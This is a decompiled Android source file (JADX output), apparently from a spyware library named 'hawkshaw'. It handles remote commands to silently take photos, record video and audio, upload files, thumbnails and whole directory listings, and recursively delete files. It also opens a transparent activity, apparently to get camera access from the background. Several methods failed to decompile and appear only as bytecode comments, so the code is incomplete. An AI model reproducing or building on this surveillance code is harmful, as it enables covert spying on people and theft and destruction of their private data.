package com.hawkshaw.library.features.media;

import N1.c;
import W2.y;
import X1.B;
import Y1.K;
import androidx.lifecycle.C0269z;
import b3.C0298a;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.features.media.camera.RecordVideoKt;
import com.hawkshaw.library.features.media.camera.TakePictureKt;
import com.hawkshaw.library.features.media.filecrud.FileUploadKt;
import com.hawkshaw.library.features.media.filecrud.ThumbnailsUtilsNewKt;
import com.hawkshaw.library.features.media.files.FileExplorerWalkV2Kt;
import com.hawkshaw.library.ktextensions.ContextKt;
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt;
import com.hawkshaw.library.logger.Logger;
import h3.e;
import h3.g;
import h3.h;
import i.C0528x;
import java.io.File;
import t3.N;

public final class HandlerKt {
    private static final String TAG = "MediaHandler";

    public /* synthetic */ class WhenMappings {
        public static final /* synthetic */ int[] $EnumSwitchMapping$0;

        /* JADX WARNING: Can't wrap try/catch for region: R(11:0|1|2|3|4|5|6|7|8|9|11) */
        /* JADX WARNING: Failed to process nested try/catch */
        /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0010 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:5:0x0019 */
        /* JADX WARNING: Missing exception handler attribute for start block: B:7:0x0022 */
        static {
            /*
                com.hawkshaw.library.datalayer.models.Command$CommandType[] r0 = com.hawkshaw.library.datalayer.models.Command.CommandType.values()
                int r0 = r0.length
                int[] r0 = new int[r0]
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.Flash     // Catch:{ NoSuchFieldError -> 0x0010 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                r2 = 1
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
            L_0x0010:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.TakePicture     // Catch:{ NoSuchFieldError -> 0x0019 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                r2 = 2
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
            L_0x0019:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.RecordVideo     // Catch:{ NoSuchFieldError -> 0x0022 }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                r2 = 3
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0022 }
            L_0x0022:
                com.hawkshaw.library.datalayer.models.Command$CommandType r1 = com.hawkshaw.library.datalayer.models.Command.CommandType.RecordAudio     // Catch:{ NoSuchFieldError -> 0x002b }
                int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x002b }
                r2 = 4
                r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x002b }
            L_0x002b:
                $EnumSwitchMapping$0 = r0
                return
            */
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.HandlerKt.WhenMappings.<clinit>():void");
        }
    }

    /* access modifiers changed from: private */
    public static final void deleteFile(Command.DeleteFileRequest deleteFileRequest) {
        boolean z4;
        if (deleteFileRequest != null) {
            if (!ManifestPermissionsKt.hasPermission("android.permission.WRITE_EXTERNAL_STORAGE")) {
                Logger.e$default(Logger.INSTANCE, TAG, "DeleteFiles: You don't have permission to write storage", (Exception) null, false, 12, (Object) null);
                return;
            }
            e eVar = new e(new g(new File(deleteFileRequest.getPath()), h.f5611E));
            loop0:
            while (true) {
                z4 = true;
                while (true) {
                    if (!eVar.hasNext()) {
                        break loop0;
                    }
                    File file = (File) eVar.next();
                    boolean delete = file.delete();
                    Logger.v$default(Logger.INSTANCE, TAG, C0528x.e("DeleteFile: ", delete ? "File deleted" : "File not deleted", ", ", file.getPath()), false, 4, (Object) null);
                    if (delete || !file.exists()) {
                        if (z4) {
                        }
                    }
                    z4 = false;
                }
            }
            Logger.log$default(Logger.INSTANCE, TAG, C0528x.e("DeleteFile: ", z4 ? "File(s) deleted" : "File(s) not deleted", ", ", deleteFileRequest.getPath()), false, 4, (Object) null);
        }
    }

    /* JADX WARNING: type inference failed for: r0v2, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x0044  */
    /* JADX WARNING: Removed duplicated region for block: B:27:0x007d  */
    /* JADX WARNING: Removed duplicated region for block: B:32:0x00a1 A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:33:0x00a2 A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0025  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object deletePendingPushFiles(com.hawkshaw.library.datalayer.models.Command.DeletePendingPushFilesRequest r9, a3.e r10) {
        /*
            boolean r0 = r10 instanceof N1.a
            if (r0 == 0) goto L_0x0013
            r0 = r10
            N1.a r0 = (N1.a) r0
            int r1 = r0.f1405G
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1405G = r1
            goto L_0x0018
        L_0x0013:
            N1.a r0 = new N1.a
            r0.<init>(r10)
        L_0x0018:
            java.lang.Object r10 = r0.f1404F
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1405G
            W2.y r3 = W2.y.f2418a
            r4 = 3
            r5 = 2
            r6 = 1
            if (r2 == 0) goto L_0x0044
            if (r2 == r6) goto L_0x0040
            if (r2 == r5) goto L_0x0038
            if (r2 != r4) goto L_0x0030
            Y1.C0110h.P(r10)
            goto L_0x00a2
        L_0x0030:
            java.lang.IllegalStateException r9 = new java.lang.IllegalStateException
            java.lang.String r10 = "call to 'resume' before 'invoke' with coroutine"
            r9.<init>(r10)
            throw r9
        L_0x0038:
            java.util.Iterator r9 = r0.f1403E
            com.hawkshaw.library.datalayer.room.files.PushFileTaskDao r2 = r0.f1402D
            Y1.C0110h.P(r10)
            goto L_0x0077
        L_0x0040:
            Y1.C0110h.P(r10)
            goto L_0x0094
        L_0x0044:
            Y1.C0110h.P(r10)
            if (r9 != 0) goto L_0x004a
            return r3
        L_0x004a:
            com.hawkshaw.library.datalayer.room.AppDatabase r10 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.files.PushFileTaskDao r10 = r10.pushFileTaskDao()
            java.util.List r2 = r9.getIds()
            java.lang.Integer r7 = new java.lang.Integer
            r8 = -12911(0xffffffffffffcd91, float:NaN)
            r7.<init>(r8)
            boolean r2 = r2.contains(r7)
            if (r2 == 0) goto L_0x006c
            r0.f1405G = r6
            java.lang.Object r9 = r10.nukeTable(r0)
            if (r9 != r1) goto L_0x0094
            return r1
        L_0x006c:
            java.util.List r9 = r9.getIds()
            java.lang.Iterable r9 = (java.lang.Iterable) r9
            java.util.Iterator r9 = r9.iterator()
            r2 = r10
        L_0x0077:
            boolean r10 = r9.hasNext()
            if (r10 == 0) goto L_0x0094
            java.lang.Object r10 = r9.next()
            java.lang.Number r10 = (java.lang.Number) r10
            int r10 = r10.intValue()
            r0.f1402D = r2
            r0.f1403E = r9
            r0.f1405G = r5
            java.lang.Object r10 = r2.delete(r10, r0)
            if (r10 != r1) goto L_0x0077
            return r1
        L_0x0094:
            r9 = 0
            r0.f1402D = r9
            r0.f1403E = r9
            r0.f1405G = r4
            java.lang.Object r9 = getPendingPushFiles(r0)
            if (r9 != r1) goto L_0x00a2
            return r1
        L_0x00a2:
            return r3
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.HandlerKt.deletePendingPushFiles(com.hawkshaw.library.datalayer.models.Command$DeletePendingPushFilesRequest, a3.e):java.lang.Object");
    }

    /* access modifiers changed from: private */
    /* JADX WARNING: Code restructure failed: missing block: B:3:0x0005, code lost:
        r2 = com.hawkshaw.library.features.misc.FlashKt.flash(com.hawkshaw.library.App.Companion.getContext(), r2, r3);
     */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object flash(com.hawkshaw.library.datalayer.models.Command.FlashRequest r2, a3.e r3) {
        /*
            W2.y r0 = W2.y.f2418a
            if (r2 != 0) goto L_0x0005
            return r0
        L_0x0005:
            com.hawkshaw.library.App$Companion r1 = com.hawkshaw.library.App.Companion
            android.content.Context r1 = r1.getContext()
            java.lang.Object r2 = com.hawkshaw.library.features.misc.FlashKt.flash(r1, r2, r3)
            b3.a r3 = b3.C0298a.f4140D
            if (r2 != r3) goto L_0x0014
            return r2
        L_0x0014:
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.HandlerKt.flash(com.hawkshaw.library.datalayer.models.Command$FlashRequest, a3.e):java.lang.Object");
    }

    /* JADX WARNING: type inference failed for: r1v3, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:16:0x0040  */
    /* JADX WARNING: Removed duplicated region for block: B:21:0x00af A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:24:0x00b8 A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0025  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object getPendingPushFiles(a3.e r20) {
        /*
            r0 = r20
            boolean r1 = r0 instanceof N1.b
            if (r1 == 0) goto L_0x0015
            r1 = r0
            N1.b r1 = (N1.b) r1
            int r2 = r1.f1407E
            r3 = -2147483648(0xffffffff80000000, float:-0.0)
            r4 = r2 & r3
            if (r4 == 0) goto L_0x0015
            int r2 = r2 - r3
            r1.f1407E = r2
            goto L_0x001a
        L_0x0015:
            N1.b r1 = new N1.b
            r1.<init>(r0)
        L_0x001a:
            java.lang.Object r0 = r1.f1406D
            b3.a r2 = b3.C0298a.f4140D
            int r3 = r1.f1407E
            r4 = 3
            r5 = 2
            r6 = 1
            if (r3 == 0) goto L_0x0040
            if (r3 == r6) goto L_0x003c
            if (r3 == r5) goto L_0x0038
            if (r3 != r4) goto L_0x0030
            Y1.C0110h.P(r0)
            goto L_0x00b9
        L_0x0030:
            java.lang.IllegalStateException r0 = new java.lang.IllegalStateException
            java.lang.String r1 = "call to 'resume' before 'invoke' with coroutine"
            r0.<init>(r1)
            throw r0
        L_0x0038:
            Y1.C0110h.P(r0)
            goto L_0x00b0
        L_0x003c:
            Y1.C0110h.P(r0)
            goto L_0x0054
        L_0x0040:
            Y1.C0110h.P(r0)
            com.hawkshaw.library.datalayer.room.AppDatabase r0 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.files.PushFileTaskDao r0 = r0.pushFileTaskDao()
            r1.f1407E = r6
            java.lang.Object r0 = r0.getAllTasks(r1)
            if (r0 != r2) goto L_0x0054
            return r2
        L_0x0054:
            java.util.List r0 = (java.util.List) r0
            com.hawkshaw.library.logger.Logger r6 = com.hawkshaw.library.logger.Logger.INSTANCE
            int r3 = r0.size()
            java.lang.StringBuilder r7 = new java.lang.StringBuilder
            r7.<init>()
            r7.append(r3)
            java.lang.String r3 = " files are pending to be uploaded"
            r7.append(r3)
            java.lang.String r8 = r7.toString()
            r10 = 4
            r11 = 0
            java.lang.String r7 = "MediaHandler"
            r9 = 0
            com.hawkshaw.library.logger.Logger.d$default(r6, r7, r8, r9, r10, r11)
            com.hawkshaw.library.datalayer.room.logger.LogEntity r3 = new com.hawkshaw.library.datalayer.room.logger.LogEntity
            com.hawkshaw.library.logger.Logger$LogLevel r13 = com.hawkshaw.library.logger.Logger.LogLevel.Log
            F3.b r6 = com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt.getJson()
            r6.getClass()
            E3.d r7 = new E3.d
            com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity$Companion r8 = com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity.Companion
            kotlinx.serialization.KSerializer r8 = r8.serializer()
            r7.<init>(r8, r9)
            java.lang.String r15 = r6.b(r7, r0)
            r18 = 8
            r19 = 0
            java.lang.String r14 = "PENDING_PUSH_FILES"
            r16 = 0
            r12 = r3
            r12.<init>(r13, r14, r15, r16, r18, r19)
            com.hawkshaw.library.datalayer.room.AppDatabase r0 = com.hawkshaw.library.datalayer.room.AppDatabaseKt.getDb()
            com.hawkshaw.library.datalayer.room.logger.LoggerDao r0 = r0.logDao()
            com.hawkshaw.library.datalayer.room.logger.LogEntity[] r3 = new com.hawkshaw.library.datalayer.room.logger.LogEntity[]{r3}
            r1.f1407E = r5
            java.lang.Object r0 = r0.insert(r3, r1)
            if (r0 != r2) goto L_0x00b0
            return r2
        L_0x00b0:
            r1.f1407E = r4
            java.lang.Object r0 = com.hawkshaw.library.logger.PushLogsKt.pushAppLogs(r1)
            if (r0 != r2) goto L_0x00b9
            return r2
        L_0x00b9:
            W2.y r0 = W2.y.f2418a
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.HandlerKt.getPendingPushFiles(a3.e):java.lang.Object");
    }

    public static final Object handleFileCommand(Command command, a3.e eVar) {
        Object B4 = B.B(N.f9292c, new c(command, (a3.e) null), eVar);
        return B4 == C0298a.f4140D ? B4 : y.f2418a;
    }

    /* JADX WARNING: Code restructure failed: missing block: B:9:0x001b, code lost:
        r3 = startMediaService(r3, r4);
     */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object handleMediaCommand(com.hawkshaw.library.datalayer.models.Command r3, a3.e r4) {
        /*
            com.hawkshaw.library.datalayer.models.Command$CommandType r0 = r3.getType()
            int[] r1 = com.hawkshaw.library.features.media.HandlerKt.WhenMappings.$EnumSwitchMapping$0
            int r0 = r0.ordinal()
            r0 = r1[r0]
            r1 = 1
            W2.y r2 = W2.y.f2418a
            if (r0 == r1) goto L_0x0025
            r1 = 2
            if (r0 == r1) goto L_0x001b
            r1 = 3
            if (r0 == r1) goto L_0x001b
            r1 = 4
            if (r0 == r1) goto L_0x001b
            return r2
        L_0x001b:
            java.lang.Object r3 = startMediaService(r3, r4)
            b3.a r4 = b3.C0298a.f4140D
            if (r3 != r4) goto L_0x0024
            return r3
        L_0x0024:
            return r2
        L_0x0025:
            com.hawkshaw.library.datalayer.models.Command$FlashRequest r3 = r3.getFlashRequest()
            java.lang.Object r3 = flash(r3, r4)
            b3.a r4 = b3.C0298a.f4140D
            if (r3 != r4) goto L_0x0032
            return r3
        L_0x0032:
            return r2
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.HandlerKt.handleMediaCommand(com.hawkshaw.library.datalayer.models.Command, a3.e):java.lang.Object");
    }

    /* access modifiers changed from: private */
    public static final Object pushFile(Command.FileRequest fileRequest, a3.e eVar) {
        y yVar = y.f2418a;
        if (fileRequest == null) {
            return yVar;
        }
        if (!ManifestPermissionsKt.hasPermission("android.permission.READ_EXTERNAL_STORAGE")) {
            Logger.e$default(Logger.INSTANCE, TAG, "PushFile: You don't have permission to read storage", (Exception) null, false, 12, (Object) null);
            return yVar;
        }
        Object pushFile = FileUploadKt.pushFile(fileRequest, eVar);
        return pushFile == C0298a.f4140D ? pushFile : yVar;
    }

    /* access modifiers changed from: private */
    public static final Object pushFileExplorerWalk(a3.e eVar) {
        boolean hasPermission = ManifestPermissionsKt.hasPermission("android.permission.READ_EXTERNAL_STORAGE");
        y yVar = y.f2418a;
        if (!hasPermission) {
            Logger.e$default(Logger.INSTANCE, TAG, "PushFileExplorerWalk: You don't have permission to read storage", (Exception) null, false, 12, (Object) null);
            return yVar;
        }
        Object pushFileExplorerWalkV2 = FileExplorerWalkV2Kt.pushFileExplorerWalkV2(eVar);
        return pushFileExplorerWalkV2 == C0298a.f4140D ? pushFileExplorerWalkV2 : yVar;
    }

    /* access modifiers changed from: private */
    public static final Object pushFiles(Command.FilesRequest filesRequest, a3.e eVar) {
        y yVar = y.f2418a;
        if (filesRequest == null) {
            return yVar;
        }
        if (!ManifestPermissionsKt.hasPermission("android.permission.READ_EXTERNAL_STORAGE")) {
            Logger.e$default(Logger.INSTANCE, TAG, "PushFiles: You don't have permission to read storage", (Exception) null, false, 12, (Object) null);
            return yVar;
        }
        Object pushFiles = FileUploadKt.pushFiles(filesRequest, eVar);
        return pushFiles == C0298a.f4140D ? pushFiles : yVar;
    }

    /* access modifiers changed from: private */
    public static final Object pushThumbnails(Command.ThumbnailRequest thumbnailRequest, a3.e eVar) {
        boolean hasPermission = ManifestPermissionsKt.hasPermission("android.permission.READ_EXTERNAL_STORAGE");
        y yVar = y.f2418a;
        if (!hasPermission) {
            Logger.e$default(Logger.INSTANCE, TAG, "PushThumbnails: You don't have permission to read storage", (Exception) null, false, 12, (Object) null);
            return yVar;
        }
        Object pushThumbnailsNew = ThumbnailsUtilsNewKt.pushThumbnailsNew(eVar);
        return pushThumbnailsNew == C0298a.f4140D ? pushThumbnailsNew : yVar;
    }

    private static final void recordAudio(C0269z zVar, Command.RecordAudioRequest recordAudioRequest) {
        if (recordAudioRequest != null) {
            if (!ManifestPermissionsKt.hasPermission("android.permission.RECORD_AUDIO")) {
                Logger.e$default(Logger.INSTANCE, TAG, "RecordAudio: You don't have microphone permission", (Exception) null, false, 12, (Object) null);
                MediaService.Companion.stopService$library_release();
            } else if (!ContextKt.isAudioRecordAllowed(zVar)) {
                boolean isAppInForeground = ContextKt.isAppInForeground(zVar);
                Logger logger = Logger.INSTANCE;
                Logger.e$default(logger, TAG, "RecordAudio: Audio Record access denied, IsAppInForeground: " + isAppInForeground, (Exception) null, false, 12, (Object) null);
                MediaService.Companion.stopService$library_release();
            } else {
                K.l(zVar, "null cannot be cast to non-null type android.content.Context");
                RecordAudioKt.recordAudio(zVar, recordAudioRequest);
            }
        }
    }

    /* access modifiers changed from: private */
    public static final Object recordVideo(C0269z zVar, Command.RecordVideoRequest recordVideoRequest, a3.e eVar) {
        y yVar = y.f2418a;
        if (recordVideoRequest == null) {
            return yVar;
        }
        if (!ManifestPermissionsKt.hasPermission("android.permission.CAMERA", "android.permission.RECORD_AUDIO")) {
            Logger.e$default(Logger.INSTANCE, TAG, "RecordVideo: You don't have camera and/or microphone permission", (Exception) null, false, 12, (Object) null);
            MediaService.Companion.stopService$library_release();
            return yVar;
        } else if (!ContextKt.isCameraAllowed(zVar)) {
            boolean isAppInForeground = ContextKt.isAppInForeground(zVar);
            Logger logger = Logger.INSTANCE;
            Logger.e$default(logger, TAG, "RecordVideo: Camera access denied, IsAppInForeground: " + isAppInForeground, (Exception) null, false, 12, (Object) null);
            MediaService.Companion.stopService$library_release();
            return yVar;
        } else {
            Object recordVideo = RecordVideoKt.recordVideo(zVar, zVar, recordVideoRequest, eVar);
            return recordVideo == C0298a.f4140D ? recordVideo : yVar;
        }
    }

    /* JADX WARNING: type inference failed for: r0v2, types: [c3.c] */
    /* access modifiers changed from: private */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:12:0x0031  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0021  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object startMediaService(com.hawkshaw.library.datalayer.models.Command r6, a3.e r7) {
        /*
            boolean r0 = r7 instanceof N1.d
            if (r0 == 0) goto L_0x0013
            r0 = r7
            N1.d r0 = (N1.d) r0
            int r1 = r0.f1412F
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1412F = r1
            goto L_0x0018
        L_0x0013:
            N1.d r0 = new N1.d
            r0.<init>(r7)
        L_0x0018:
            java.lang.Object r7 = r0.f1411E
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1412F
            r3 = 1
            if (r2 == 0) goto L_0x0031
            if (r2 != r3) goto L_0x0029
            com.hawkshaw.library.datalayer.models.Command r6 = r0.f1410D
            Y1.C0110h.P(r7)
            goto L_0x005f
        L_0x0029:
            java.lang.IllegalStateException r6 = new java.lang.IllegalStateException
            java.lang.String r7 = "call to 'resume' before 'invoke' with coroutine"
            r6.<init>(r7)
            throw r6
        L_0x0031:
            Y1.C0110h.P(r7)
            com.hawkshaw.library.features.media.MediaService$Companion r7 = com.hawkshaw.library.features.media.MediaService.Companion
            r7.stopService$library_release()
            android.content.Intent r7 = new android.content.Intent
            com.hawkshaw.library.App$Companion r2 = com.hawkshaw.library.App.Companion
            android.content.Context r4 = r2.getContext()
            java.lang.Class<com.hawkshaw.library.activities.TransparentActivity> r5 = com.hawkshaw.library.activities.TransparentActivity.class
            r7.<init>(r4, r5)
            r4 = 268435456(0x10000000, float:2.524355E-29)
            r7.setFlags(r4)
            android.content.Context r2 = r2.getContext()
            r2.startActivity(r7)
            r0.f1410D = r6
            r0.f1412F = r3
            r2 = 1000(0x3e8, double:4.94E-321)
            java.lang.Object r7 = Y1.K.C(r2, r0)
            if (r7 != r1) goto L_0x005f
            return r1
        L_0x005f:
            com.hawkshaw.library.features.media.MediaService$Companion r7 = com.hawkshaw.library.features.media.MediaService.Companion
            r7.handleMediaCommand$library_release(r6)
            W2.y r6 = W2.y.f2418a
            return r6
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.HandlerKt.startMediaService(com.hawkshaw.library.datalayer.models.Command, a3.e):java.lang.Object");
    }

    /* access modifiers changed from: private */
    public static final Object takePicture(C0269z zVar, Command.TakePictureRequest takePictureRequest, a3.e eVar) {
        y yVar = y.f2418a;
        if (takePictureRequest == null) {
            return yVar;
        }
        if (!ManifestPermissionsKt.hasPermission("android.permission.CAMERA")) {
            Logger.e$default(Logger.INSTANCE, TAG, "TakePicture: You don't have camera permission", (Exception) null, false, 12, (Object) null);
            MediaService.Companion.stopService$library_release();
            return yVar;
        } else if (!ContextKt.isCameraAllowed(zVar)) {
            boolean isAppInForeground = ContextKt.isAppInForeground(zVar);
            Logger logger = Logger.INSTANCE;
            Logger.e$default(logger, TAG, "TakePicture: Camera access denied, IsAppInForeground: " + isAppInForeground, (Exception) null, false, 12, (Object) null);
            MediaService.Companion.stopService$library_release();
            return yVar;
        } else {
            Object takePicture = TakePictureKt.takePicture(zVar, zVar, takePictureRequest, eVar);
            return takePicture == C0298a.f4140D ? takePicture : yVar;
        }
    }

    public static final Object handleMediaCommand(C0269z zVar, Command command, a3.e eVar) {
        int i5 = WhenMappings.$EnumSwitchMapping$0[command.getType().ordinal()];
        y yVar = y.f2418a;
        if (i5 == 2) {
            Object takePicture = takePicture(zVar, command.getTakePictureRequest(), eVar);
            return takePicture == C0298a.f4140D ? takePicture : yVar;
        } else if (i5 != 3) {
            if (i5 == 4) {
                recordAudio(zVar, command.getRecordAudioRequest());
            }
            return yVar;
        } else {
            Object recordVideo = recordVideo(zVar, command.getRecordVideoRequest(), eVar);
            return recordVideo == C0298a.f4140D ? recordVideo : yVar;
        }
    }
}
